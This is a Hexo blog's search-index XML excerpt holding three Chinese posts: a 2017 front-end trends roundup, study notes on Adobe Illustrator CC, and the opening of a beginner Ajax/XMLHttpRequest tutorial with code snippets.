<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2017 前端大事件和趋势回顾，2018 何去何从？</title>
    <url>/hexolog/post/f9211a6.html</url>
    <content><![CDATA[<p><a href="https://mp.weixin.qq.com/s/GhCdntYKN_9Y9tk6ENRFDg" target="_blank" rel="noopener" title="Permalink to 2017 前端大事件和趋势回顾，2018 何去何从？">Source</a></p>
<h1 id="2017-前端大事件和趋势回顾2018-何去何从"><a class="markdownIt-Anchor" href="#2017-前端大事件和趋势回顾2018-何去何从"></a> 2017 前端大事件和趋势回顾，2018 何去何从？</h1>
<blockquote>
<p>2017年，前端开发继续飞速发展。以下是在过去的一年中非常值得关注的十大事件整理，主要参考了国内外的一些报道和文章，希望能对大家在思考 2018 年的趋势和走向上有所帮助。欢迎指正、评论和补充。</p>
</blockquote>
<h3 id="1-react-16-和-mit-许可证"><a class="markdownIt-Anchor" href="#1-react-16-和-mit-许可证"></a> <strong>1、React 16 和 MIT 许可证</strong></h3>
<p>2017年，React 继续在前端领域占据主导地位，备受期待的 React 16 也正式发布。该版本包含可实现异步 UI 渲染的 fiber 架构，以及更便捷的错误管理。</p>
<p>不过，React 更引人关注的不是其新特性，而是开源许可证的更改。Facebook 放弃了导致很多企业拒绝使用其开源项目的 BSD+专利许可模式，并采用了对用户友好的 MIT 许可证。同时，Jest、Flow、Immutable.js 和 GraphQL 等项目也更改为了 MIT 许可证。</p>
<a id="more"></a>
<blockquote>
<p>相关阅读：</p>
</blockquote>
<ul>
<li><a href="https://www.oschina.net/news/89089/react-16-0-0" target="_blank" rel="noopener">React 16.0.0 发布，去除专利条款，改用 MIT 许可证</a></li>
<li><a href="https://www.oschina.net/news/87076/facebook-reactjs-license" target="_blank" rel="noopener">Facebook 被集体&quot;声讨&quot;，要求更改 ReactJS 许可</a></li>
</ul>
<h3 id="2-下一代-web-应用模型-pwa"><a class="markdownIt-Anchor" href="#2-下一代-web-应用模型-pwa"></a> <strong>2、下一代 Web 应用模型 — PWA</strong></h3>
<p>PWA（Progressive Web App）是 Google 于 2016 年提出的概念，2017 年已被迅速采用。PWA 旨在增强 Web 体验，可显著提高加载速度、可离线工作、可被添加至主屏、全屏执行、推送通知消息等等。这些特性将使得 Web 应用渐进式接近原生 App。</p>
<blockquote>
<p>相关阅读：</p>
</blockquote>
<ul>
<li><a href="https://developers.google.com/web/fundamentals/codelabs/your-first-pwapp/?hl=zh-cn" target="_blank" rel="noopener">您的第一个 Progressive Web App</a></li>
<li><a href="https://www.oschina.net/news/91277/google-removes-chrome-apps-from-chrome-web-store" target="_blank" rel="noopener">Chrome Web App 已被谷歌干掉 未来将主推 PWA</a></li>
</ul>
<h3 id="3-yarn-快速普及npm-跟上脚步"><a class="markdownIt-Anchor" href="#3-yarn-快速普及npm-跟上脚步"></a> <strong>3、Yarn 快速普及，NPM 跟上脚步</strong></h3>
<p>Facebook 与 Exponent、 Google 和 Tilde 合作开发的 Yarn 在2016年10月发布以后，迅速蹿红。Yarn 可以看做是对 NPM 缺失的一些关键特性的补充，能够更快速地安装软件包和管理依赖关系，并且可以在跨机器或者无网络的安全环境中保持代码的一致性。据悉，Yarn 下载量目前已超过10亿次（每月下载量达到125万次）。</p>
<p>Yarn 的成功，使得 NPM 在 5.0 版本中也加入了上述的这些特性。</p>
<blockquote>
<p>相关阅读：</p>
</blockquote>
<ul>
<li><a href="https://www.oschina.net/news/85338/npm-5-0-0-released" target="_blank" rel="noopener">npm v5.0.0 正式发布，改进了稳定性</a></li>
<li><a href="https://www.oschina.net/news/78072/yarn-a-new-package-manager-for-javascript" target="_blank" rel="noopener">Facebook 新推 Yarn，或取代 npm 客户端</a></li>
</ul>
<h3 id="4-webassembly-受主流浏览器支持"><a class="markdownIt-Anchor" href="#4-webassembly-受主流浏览器支持"></a> <strong>4、WebAssembly 受主流浏览器支持</strong></h3>
<p>WebAssembly （wasm）在今年受到了所有主流浏览器的支持，包括 Chrome、Firefox、Safari 和 Edge 。wasm 源于 Mozilla 发起的 Asm.js 项目，用于补充 JavaScript，其本地解码速度比 JS 解析快得多，让高性能的 Web 应用在浏览器上运行成为可能，比如视频游戏、计算机辅助设计、视频和图像编辑、科学可视化等等。</p>
<p>而且由于 wasm 字节码（Bytecode）较一般程序代码小许多倍，意谓着这项标准可节省移动设备的使用带宽，有助于改善网页加载速度，且字节码更适合浏览器读取。</p>
<p>wasm 还提供了一个JavaScript API，为前端开发人员提供了一个更容易的切入点。</p>
<blockquote>
<p>相关阅读：</p>
</blockquote>
<ul>
<li><a href="https://www.oschina.net/news/90591/popular-browsers-add-webassembly" target="_blank" rel="noopener">主流浏览器都加入了 WebAssembly 支持</a></li>
<li><a href="https://www.oschina.net/news/91079/rust-gets-direct-webassembly-compilation" target="_blank" rel="noopener">抢先一步，Rust 构建版支持直接编译 WebAssembly</a></li>
</ul>
<h3 id="5-angular-发布了-v4以及v5"><a class="markdownIt-Anchor" href="#5-angular-发布了-v4以及v5"></a> <strong>5、Angular 发布了 v4，以及……v5</strong></h3>
<p>由于采用语义化版本控制，Angular 在今年跨越了两个大版本：于 3月23日 发布的 Angular 4 以及于 11月1日 发布的 Angular 5。Angular 4 优化了视图引擎、减少代码体积；Angular 5 中包含了一些用户期待已久的改进，像是编译器的改进，能更快的构建/重建；新的 @angular/service-worker 包能够更好的构建渐进式 Web 应用程序。</p>
<blockquote>
<p>相关阅读：</p>
</blockquote>
<ul>
<li><a href="https://www.oschina.net/news/90170/angular-5-0-0" target="_blank" rel="noopener">Angular 5.0.0 发布，Web 前端框架</a></li>
<li><a href="https://www.oschina.net/news/83195/angular-4-0-0-released" target="_blank" rel="noopener">Angular 4.0.0 正式版发布， Web 前端框架</a></li>
<li><a href="https://www.oschina.net/news/82842/angular-4-plan-to-released-by-3-22" target="_blank" rel="noopener">没有 Angular 3 ，Angular 4 计划2017年3月发布</a></li>
</ul>
<h3 id="6-vuejs-继续流行"><a class="markdownIt-Anchor" href="#6-vuejs-继续流行"></a> <strong>6、Vue.js 继续流行</strong></h3>
<p>既然说到了 React ，说到了 Angular ，自然不能落下 Vue 。2017年，Vue 依然越来越受欢迎，该框架提供基于组件的架构，是 React 在因许可证问题被抵制时的主要替代方案之一。它已经被包括 GitLab 在内的许多大型公司采用，在 Stack Overflow 上的关注度居高不下。</p>
<blockquote>
<p>相关阅读：</p>
</blockquote>
<ul>
<li><a href="https://www.oschina.net/news/88935/vue-js-be-the-best-choice-for-wordpress" target="_blank" rel="noopener">Vue.js 框架成为 WordPress 弃用 React 后的最佳选择</a></li>
<li><a href="https://www.oschina.net/translate/why-and-how-we-migrated-from-angularjs-to-vuejs" target="_blank" rel="noopener">翻译 | 我们为什么以及是如何从 Angular.js 迁移到 Vue.js ？</a></li>
</ul>
<h3 id="7-css-in-js-在争议中沉淀"><a class="markdownIt-Anchor" href="#7-css-in-js-在争议中沉淀"></a> <strong>7、CSS-in-JS 在争议中沉淀</strong></h3>
<p>React 的出现，打破了以前&quot;关注点分离&quot;的网页开发原则，因其采用组件结构，组件强制要求把 HTML、CSS、JavaScript 写在一起。随着 React 的走红和组件模式深入人心，这种&quot;关注点混合&quot;的新写法逐渐成为主流。表面上，React 的写法是 HTML、CSS、JavaScript 混合在一起。实际上并不是，其实是用 JavaScript 在写 HTML 和 CSS，React 是在 JavaScript 里面实现了对 HTML 和 CSS 的封装。</p>
<p>由于 CSS 的封装非常弱，导致了一系列的第三方库，用来加强 React 的 CSS 操作，它们统称为 CSS in JS，意思就是使用 JS 语言写 CSS。</p>
<p>CSS in JS 的出现带来了很多争议，有不少人认为是在重复造轮子，或者说是没有找到其优势。CSS-IN-JS 是不是未来的方向我们暂且不议，但其在2017年已得到明显的采用。</p>
<h3 id="8-静态网站卷土重来"><a class="markdownIt-Anchor" href="#8-静态网站卷土重来"></a> <strong>8、静态网站卷土重来</strong></h3>
<p>2017 ，静态网站卷土重来。Gatsby 等框架使你能够使用 React 和其他现代工具构建静态网站。不是每个网站都需要或应该是一个复杂的现代 Web 应用，静态网站生成器能够提供的服务器端渲染和无与伦比的速度，正式其优势所在。</p>
<p>静态网站生成器还引发了另一个被称为 JAMStack 的趋势：“JavaScript，APIs，Markup”。 JAMStack 使用相同的静态预构建 HTML 文件以及可重复使用的 API 和 JavaScript 来处理请求/响应周期内的任何动态编程，旨在提供更好的性能，更高的安全性，更低的扩展成本和更优的开发人员体验。</p>
<h3 id="9-graphql-继续挑战-rest"><a class="markdownIt-Anchor" href="#9-graphql-继续挑战-rest"></a> <strong>9、GraphQL 继续挑战 REST</strong></h3>
<p>虽然很多人认为 GraphQL 在2017年依然没有火起来，但不可否认的是 GraphQL 已逐渐占据了一席之地。不再管理多个端点并获取不必要的数据，GraphQL 允许客户端声明式地定义所需的数据，并从单个端点检索所有数据。这也正式它在刚出现时被认为是革命性的 API 工具的原因，因为它可以让客户端在请求中指定希望得到的数据，而不像传统的 REST 那样只能呆板地在服务端进行预定义。</p>
<h3 id="10-typescript-和-flow-受追捧"><a class="markdownIt-Anchor" href="#10-typescript-和-flow-受追捧"></a> <strong>10、TypeScript 和 Flow 受追捧</strong></h3>
<p>2017年，TypeScript 受到了很多 JavaScript 开发者的追捧。TypeScript 由微软创建，也是新版 Angular 采用的语言，其强类型正式优势所在。 而 Flow 则提供了一种更加灵活的方式来引入类型，而不需要进行重构。</p>
<p><strong>本文由开源中国整理，转载请注明出处。</strong></p>
<p>推荐阅读</p>
<h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2>
<p><a href="http://mp.weixin.qq.com/s?__biz=MjM5NzM0MjcyMQ==&amp;mid=2650075982&amp;idx=1&amp;sn=651c5104ef4b2e2b70ca38060d3a02af&amp;chksm=bedb282089aca13699a692c36f0d3217eab88e5fa7abba9990e2ae9e84454737b717a4a51fa8&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">Linux 运维人员最常用 150 个命令汇总</a></p>
<p><a href="http://mp.weixin.qq.com/s?__biz=MjM5NzM0MjcyMQ==&amp;mid=2650076095&amp;idx=2&amp;sn=90a3ab6e2b5f881151b17a7edec58175&amp;chksm=bedb28d189aca1c7186824772706a420fb2b0a1744e4ce1e4330cae14dad505000d165d0cfb4&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">从 Zero 到 Hero ，一文掌握 Python</a></p>
]]></content>
      <categories>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>前端记事</tag>
      </tags>
  </entry>
  <entry>
    <title>Adobe Illustrator CC 学习笔记</title>
    <url>/hexolog/post/3a977c25.html</url>
    <content><![CDATA[<blockquote>
<p>视频资料<a href="http://www.51zxw.net/list.aspx?cid=586" target="_blank" rel="noopener">Illustrator CC实例教程-我要自学网</a>，里面都是满满的干货，非常受用。</p>
</blockquote>
<h2 id="adobe-illustrator-cc-介绍"><a class="markdownIt-Anchor" href="#adobe-illustrator-cc-介绍"></a> Adobe Illustrator CC 介绍</h2>
<p>Adobe Illustrator CC 是矢量图软件，而 Photoshop CC 是位图软件。矢量图可以无损缩放，体积也很小，但不适用于色彩复杂的图形创作。</p>
<a id="more"></a>
<h3 id="软件的基本操作方法"><a class="markdownIt-Anchor" href="#软件的基本操作方法"></a> 软件的基本操作方法</h3>
<p>创建项目时，有两种颜色模式：RGB（红绿蓝-白，色光三原色、加法三原色）、CMYK（青品红黄-黑，色料三原色、减法三原色、印刷四分色）</p>
<p>&quot;存储为&quot;与&quot;导出&quot;操作，可以导出为多种格式的文件。常用的有：jpg（有损）、tif（无损）、png（透明）、psd（图层）、<code>pdf(一个项目中有多个画板时，导出成pdf格式，会存储在一个pdf文档中)</code>。</p>
<h3 id="选择工具与直接选择工具的区别"><a class="markdownIt-Anchor" href="#选择工具与直接选择工具的区别"></a> <em>选择工具</em>与<em>直接选择工具</em>的区别</h3>
<p><strong>共有</strong></p>
<ol>
<li><code>多边形圆角化</code>（鼠标左键拖动尖角内靠近的带圆心的小圆圈）；</li>
<li><code>快速复制</code>（鼠标左键<kbd>+ Art</kbd>拖动图形）；</li>
<li><code>移动</code>；</li>
<li><code>框选</code>；</li>
<li>右键选项一样（变换与再次变换(<kbd>Ctrl+D</kbd>)很方便）。</li>
</ol>
<p><strong>选择工具</strong> 主要针对整体<br />
<code>鼠标左键</code>可以实施的操作：缩放（<kbd>+ Shift</kbd>等比缩放）、旋转；不方便操作锚点。</p>
<p><strong>直接选择工具</strong> 主要针对锚点<br />
<code>分割锚点</code>: 选择图像 ⇒ 选择锚点 ⇒ 点击上方菜单栏中的分割锚点图标 ⇒ 然后拖动线条，就分开了 ；<br />
<code>连接锚点</code>: 框选住（或者用套索工具套索住）两个分开的锚点 ⇒ 点击上方菜单栏中的连接锚点图标；</p>
<blockquote>
<p>注意：将图片放大(<kbd>Art+鼠标上滚</kbd>)后，操作锚点更准确快速</p>
</blockquote>
<p><code>拖拉锚点</code>: 选中锚点后拖拉，使图像变形。</p>
<h3 id="标准图像的绘制"><a class="markdownIt-Anchor" href="#标准图像的绘制"></a> 标准图像的绘制</h3>
<ol>
<li>矩形工具</li>
<li>圆角矩形（<code>直接鼠标左键拖动</code>后，仍按住左键不放，同时按住<code>方向上/左/右</code>可以调整圆角半径大小）</li>
<li>椭圆工具</li>
<li>多边形工具（<code>点击+输入</code>方法绘制，可设置边数；边数达到一定数时相当于圆形；n条边就有n个锚点）</li>
<li>星形工具（<code>点击+输入</code>方法绘制，可设置边角数；绘制爆炸图形）</li>
<li>光晕工具（选取部分可以模拟眼睛形状）</li>
</ol>
<p>普通绘制方式有两种：<strong>点击+输入</strong>、<strong>直接鼠标左键拖动</strong>。<br />
对于这两种方式而言，都是从<code>点击点</code>开始，从左至右、从上至下绘制，不方便绘制<code>同心图形</code>。</p>
<p><strong>正多边形或圆的绘制</strong>：借助辅助键<kbd>Shift</kbd></p>
<p><strong>同心图形的绘制</strong>：鼠标移至上个图形的几何中心 ⇒ <kbd>Art</kbd>+<code>鼠标左/右键</code>拖动。所以要画同心圆就需要用到<kbd>Art</kbd>+<kbd>Shift</kbd>+<code>鼠标左/右键</code>拖动。</p>
<blockquote>
<p>(<kbd>Ctrl + C</kbd> - <kbd>Ctrl + F</kbd>)可以将复制的元素粘贴在原位置;按住<kbd>Art</kbd>缩放可以以中心为定点缩放。</p>
</blockquote>
<h3 id="钢笔工具主要用于描线绘图"><a class="markdownIt-Anchor" href="#钢笔工具主要用于描线绘图"></a> 钢笔工具（主要用于描线绘图）</h3>
<ol>
<li>钢笔工具[钢笔+星号]</li>
<li>添加锚点工具[钢笔+加号]</li>
<li>删除锚点工具[钢笔+减号]</li>
<li>锚点工具[尖角号]（锚点的手柄即切线）</li>
</ol>
<p><strong>钢笔工具</strong><br />
钢笔工具+辅助键<kbd>Art</kbd>,可以临时切换到锚点工具，松开<kbd>Art</kbd>后又会自动回到钢笔工具；</p>
<p>钢笔工具画线有两种方式，分别对应直线与曲线。</p>
<ol>
<li>直线：点击鼠标(取一个端点) ⇒ 松开鼠标 ⇒ <code>拖动鼠标</code> ⇒ 点击鼠标(取一个终点)；</li>
<li>曲线：点击鼠标(取一个端点) ⇒ 松开鼠标 ⇒ <code>点击鼠标拖动</code>(点击取一个切点，拖动取的是切线方向) ⇒ 点击鼠标(取一个终点)或者继续<code>点击鼠标拖动</code>；</li>
</ol>
<p><strong>上色</strong>：<br />
描线绘图的上色需要用到实时上色工具（<kbd>K</kbd>）与实时上色选择工具<kbd>Shift+L</kbd>。</p>
<blockquote>
<p>用选择工具选择需要上色的描绘图 ⇒ [顶部菜单栏-对象-实时上色-建立]<kbd>Ctrl+Alt+X</kbd> ⇒ 调用左侧菜单中的实时上色工具或实时上色选择工具操作；也可以省掉建立实时上色而直接调用实时上色工具（因为它会自动帮我们建立实时上色）。</p>
</blockquote>
<h3 id="路径菜单顶部菜单栏-对象-路径"><a class="markdownIt-Anchor" href="#路径菜单顶部菜单栏-对象-路径"></a> 路径菜单[顶部菜单栏-对象-路径]</h3>
<blockquote>
<p>一旦对闭合路径上色，则这个区域就成为了面，之前的路径就成了现在这个面的边。未上色前，可以在路径内部区域实施框选操作，而上色后则无法实施框选操作（点击拖动变成了移动面的操作）。此时要想只选择部分线条或锚点，则只有套索工具可以完成了。</p>
</blockquote>
<ol>
<li>连接（只能连接同意路径或两个不同路径的两个端点）</li>
<li>平均</li>
</ol>
<ul>
<li>水平</li>
<li>垂直</li>
<li>两者均有（可以将多个锚点拉伸集中到一个点）</li>
</ul>
<ol start="3">
<li>轮廓化描边（执行后，放大可以看到路径或图形边界的外部又有了一个边界路径；结合曲率工具<kbd>Shift + ~</kbd>可以拉拽出漂亮的图形）</li>
<li>偏移路径（按照现有路径或图形的形状，在其轮廓外画出一条与之隔有一定距离的闭合路径。与轮廓化描边比较类似。）<em>很方便有两条垂直交叉直线画出一个空心十字架哦</em></li>
<li>简化（减少锚点）</li>
<li>添加锚点（对于所有直线，均匀的添加锚点）</li>
<li>移去锚点（用的少）</li>
<li>分割下方对象（对一条贯穿<code>闭合路径或图像</code>的路径实施此操作，可以将<code>闭合路径或图像</code>分割成两部分。例子：由正方形画七巧板）</li>
<li>分割成网格</li>
</ol>
<h3 id="直线工具箱与描边窗口"><a class="markdownIt-Anchor" href="#直线工具箱与描边窗口"></a> 直线工具箱与描边窗口</h3>
<ol>
<li>直线段工具<br />
直线的绘制方式也有两种：<strong>点击+输入</strong>、<strong>直接鼠标左键拖动</strong>。前者可以更精确的确定长度及倾斜角度。</li>
</ol>
<p>所有的线或路径都可以在描边窗口中调整线的粗细、虚实、箭头、端点与边角的形状、外观、渐变等等。<code>描边窗口</code>可在右侧菜单栏的三横杠图标调出，也可在顶部菜单栏 ⇒ 窗口 ⇒ 描边窗口找到。</p>
<ol start="2">
<li>弧形、螺线形、矩形网格工具、极坐标工具</li>
</ol>
<p>绘制网格有两种方法：</p>
<ol>
<li>矩形网格工具：是由线段组成的网格。</li>
<li>路径–分割为网格：是由小矩形块组成的网格。（用于标准制图的网格用该方法来绘制）</li>
</ol>
<h3 id="画笔工具"><a class="markdownIt-Anchor" href="#画笔工具"></a> 画笔工具</h3>
<p>可以置入图片(注意置入时把链接单选框取消)来自建画笔，也可以用项目内创建的图形来自建画笔。</p>
<h2 id="基本绘图"><a class="markdownIt-Anchor" href="#基本绘图"></a> 基本绘图</h2>
<h3 id="路径查找器的使用在logo设计中很重要"><a class="markdownIt-Anchor" href="#路径查找器的使用在logo设计中很重要"></a> 路径查找器的使用<code>【在LOGO设计中很重要】</code></h3>
<p>路径查找器（窗口-路径查找器）主要用来做两个或多个路径或图形的剪裁、合并、拼接等等。</p>
<ol>
<li>形状模式</li>
</ol>
<ul>
<li>联集（合并）</li>
<li>交集</li>
<li>差集</li>
<li>减去顶层(沿顶层边缘裁去顶层)<br />
前三种模式都是取顶层的颜色为操作后的颜色。</li>
</ul>
<p>2.路径查找器</p>
<ul>
<li>分割（分割后，取消编组，就可以分离了）</li>
<li>合并（可以很快就做出空心十字架）</li>
<li>修边</li>
<li>剪裁（与交集的区别在于留取了顶层图形的差集部分，只是将它的颜色去掉了）</li>
<li>轮廓</li>
<li>减去后方对象(沿底层边缘裁去底层)</li>
</ul>
<h3 id="渐变颜色的使用"><a class="markdownIt-Anchor" href="#渐变颜色的使用"></a> 渐变颜色的使用</h3>
<ol>
<li>类型（线性、径向）</li>
<li>角度</li>
<li>渐变滑块</li>
</ol>
<ul>
<li>删减：在渐变条的下边缘点击，可以添加渐变滑块；按住渐变滑块向下甩，可以删除它。</li>
<li>控制面板：双击渐变滑块，可以调出它的控制面板。
<ul>
<li>不透明度</li>
<li>颜色：灰度、HSB、RGB、CMKL、Web安全RGB</li>
<li>色板</li>
</ul>
</li>
</ul>
<h2 id="测距"><a class="markdownIt-Anchor" href="#测距"></a> 测距</h2>
<ul>
<li><strong>度量工具</strong>（在吸管栏的工具里有个度量工具）<br />
任意单击两个位置，即可显示两位置的水平与垂直距离。</li>
</ul>
<blockquote>
<p>相关: Adobe Animate CC 2017 入门教程——<a href="http://www.51zxw.net/list.aspx?cid=632" target="_blank" rel="noopener">Animate动画案例教程</a></p>
</blockquote>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Illustrator</tag>
      </tags>
  </entry>
  <entry>
    <title>Ajax总结篇</title>
    <url>/hexolog/post/d4e64c45.html</url>
    <content><![CDATA[<blockquote>
<p>本文主要总结整理<code>Ajax</code>的一些常用的基础知识，适合初学者。</p>
</blockquote>
<h3 id="一-ajax简介-优劣势-应用场景以及技术"><a class="markdownIt-Anchor" href="#一-ajax简介-优劣势-应用场景以及技术"></a> 一、Ajax简介、优劣势、应用场景以及技术</h3>
<hr />
<ul>
<li>
<p>Ajax简介 :</p>
<ul>
<li><code>Asynchronous Javascript And XML</code> （异步的<br />
<code>JavaScript</code>和<code>XML</code>）</li>
<li>它并不是一种单一的技术，而是有机利用一系列交互式网页应用相关的技术所形成的结合体</li>
<li><code>AJAX</code> 是一种用于创建快速动态网页的技术。通过在后台与服务器进行少量数据交换，<code>AJAX</code> 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</li>
</ul>
</li>
<li>
<p>优点：</p>
<ul>
<li>页面无刷新，用户体验好。</li>
<li>异步通信，更加快的响应能力。</li>
<li>减少冗余请求，减轻了服务器负担</li>
<li>基于标准化的并被广泛支持的技术，不需要下载插件或者小程序</li>
</ul>
</li>
<li>
<p>缺点：</p>
<ul>
<li><code>ajax</code>干掉了<code>back</code>按钮，即对浏览器后退机制的破坏。</li>
<li>存在一定的安全问题。</li>
<li>对搜索引擎的支持比较弱。</li>
<li>破坏了程序的异常机制。</li>
<li>无法用<code>URL</code>直接访问</li>
</ul>
</li>
<li>
<p><code>ajax</code>应用场景</p>
<ul>
<li>场景 1. 数据验证</li>
<li>场景 2. 按需取数据</li>
<li>场景 3. 自动更新页面</li>
</ul>
</li>
<li>
<p><code>AJAX</code> 包含以下五个部分：<br />
<code>ajax</code>并非一种新的技术，而是几种原有技术的结合体。它由下列技术组合而成。</p>
<ul>
<li>使用<code>CSS</code>和<code>XHTML</code>来表示。</li>
<li>使用<code>DOM</code>模型来交互和动态显示。</li>
<li>数据互换和操作技术，使用<code>XML</code>与<code>XSLT</code></li>
<li>使用<code>XMLHttpRequest</code>来和服务器进行异步通信。</li>
<li>使用<code>javascript</code>来绑定和调用。</li>
</ul>
</li>
</ul>
<p>在上面几中技术中，除了<code>XmlHttpRequest</code>对象以外，其它所有的技术都是基于<code>web</code>标准并且已经得到了广泛使用的，<code>XMLHttpRequest</code>虽然目前还没有被<code>W3C</code>所采纳，但是它已经是一个事实的标准，因为目前几乎所有的主流浏览器都支持它</p>
<a id="more"></a>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-6937419905da762f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="两张著名的AJAX 介绍的图" /></p>
<ul>
<li>第一张图尤其说明了传统 <code>Web</code> 应用程序的结构与采用了 <code>AJAX</code> 技术的 <code>Web</code><br />
应用程序的结构上的差别</li>
<li>主要的差别，其实不是 <code>JavaScript</code>，不是 <code>HTML/XHTML</code>和 <code>CSS</code>，而是采用<br />
了 <code>XMLHttpRequest</code> 来向服务器异步的请求 <code>XML</code> 数据</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-13adc82666fac3a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="AJAX 介绍的图" /></p>
<ul>
<li>再来看第二张图，传统的 <code>Web</code> 应用模式，用户的体验是割裂的，点击-&gt;等待-&gt;<br />
看到新的页面-&gt;再点击-&gt;再等待。而采用了<code>AJAX</code>技术之后，大部分的计算工作，都是在用户不察觉的情况下，交由服务器去完成了</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-4c6beed36bb246c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="XMLHttpRequest对象的属性" /></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-1092e842e08d9012.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="XMLHttpRequest对象的方法" /></p>
<h3 id="二-创建ajax的步骤"><a class="markdownIt-Anchor" href="#二-创建ajax的步骤"></a> 二、创建ajax的步骤</h3>
<hr />
<blockquote>
<p><code>Ajax</code>的原理简单来说通过<code>XmlHttpRequest</code>对象来向服务器发异步请求，从服务器获得数据，然后用<code>javascript</code>来操作<code>DOM</code>而更新页面。这其中最关键的一步就是从服务器获得请求数据。原生创建<code>ajax</code>可分为以下四步</p>
</blockquote>
<h4 id="1-创建xmlhttprequest对象"><a class="markdownIt-Anchor" href="#1-创建xmlhttprequest对象"></a> 1、创建<code>XMLHttpRequest</code>对象</h4>
<hr />
<p><code>Ajax</code>的核心是<code>XMLHttpRequest</code>对象，它是<code>Ajax</code>实现的关键，发送异步请求、接受响应以及执行回调都是通过它来完成</p>
<p>所有现代浏览器（IE7+、Firefox、Chrome、Safari 以及 Opera）均内建 XMLHttpRequest 对象。</p>
<ul>
<li>创建 <code>XMLHttpRequest</code>对象的语法：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br></pre></td></tr></table></figure>
<ul>
<li>老版本的 <code>Internet Explorer</code>（IE5 和 IE6）使用 <code>ActiveX</code> 对象：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br></pre></td></tr></table></figure>
<p>为了应对所有的现代浏览器，包括 <code>IE5</code> 和 <code>IE6</code>，请检查浏览器是否支持 <code>XMLHttpRequest</code>对象。如果支持，则创建 <code>XMLHttpRequest</code>对象。如果不支持，则创建 <code>ActiveXObject</code>：</p>
<ul>
<li>兼容各个浏览器的创建<code>Ajax</code>的工具函数</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createRequest</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">	&#125;<span class="keyword">catch</span> (tryMS)&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			xhr = <span class="keyword">new</span> ActiveXObject(<span class="string">"Msxm12.XMLHTTP"</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (otherMS) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				xhr = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">			&#125;<span class="keyword">catch</span> (failed) &#123;</span><br><span class="line">				xhr = <span class="literal">null</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> xhr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-准备请求"><a class="markdownIt-Anchor" href="#2-准备请求"></a> 2、准备请求</h4>
<hr />
<ul>
<li>初始化该<code>XMLHttpRequest</code>对象，接受三个参数：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhr.open(method,url,<span class="keyword">async</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数表示请求类型的字符串，其值可以是<code>GET</code>或者<code>POST</code>。</li>
<li><code>GET</code>请求：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhr.open(<span class="string">"GET"</span>,demo.php?name=tsrot&amp;age=<span class="number">24</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>POST</code>请求：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhr.open(<span class="string">"POST"</span>,demo.php,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>第二个参数是要作为请求发送目标的URL。</li>
<li>第三个参数是<code>true</code>或<code>false</code>，表示请求是以异步还是同步的模式发出。（默认为<code>true</code>，一般不建议为<code>false</code>）
<ul>
<li><code>false</code>：同步模式发出的请求会暂停所有javascript代码的执行，知道服务器获得响应为止，如果浏览器在连接网络时或者在下载文件时出了故障，页面就会一直挂起。</li>
<li><code>true</code>：异步模式发出的请求，请求对象收发数据的同时，浏览器可以继续加载页面，执行其他javascript代码</li>
</ul>
</li>
</ul>
<h4 id="3-发送请求"><a class="markdownIt-Anchor" href="#3-发送请求"></a> 3、发送请求</h4>
<hr />
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
<p>一般情况下，使用<code>Ajax</code>提交的参数多是些简单的字符串，可以直接使用<code>GET</code>方法将要提交的参数写到<code>open</code>方法的<code>url</code>参数中，此时<code>send</code>方法的参数为<code>null</code>或为空。</p>
<ul>
<li><code>GET</code>请求：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhr.open(<span class="string">"GET"</span>,demo.php?name=tsrot&amp;age=<span class="number">24</span>,<span class="literal">true</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>POST</code>请求：<br />
如果需要像 <code>HTML</code> 表单那样 <code>POST</code> 数据，请使用 <code>setRequestHeader()</code> 来添加 <code>HTTP</code> 头。然后在 <code>send()</code>方法中规定您希望发送的数据：</li>
</ul>
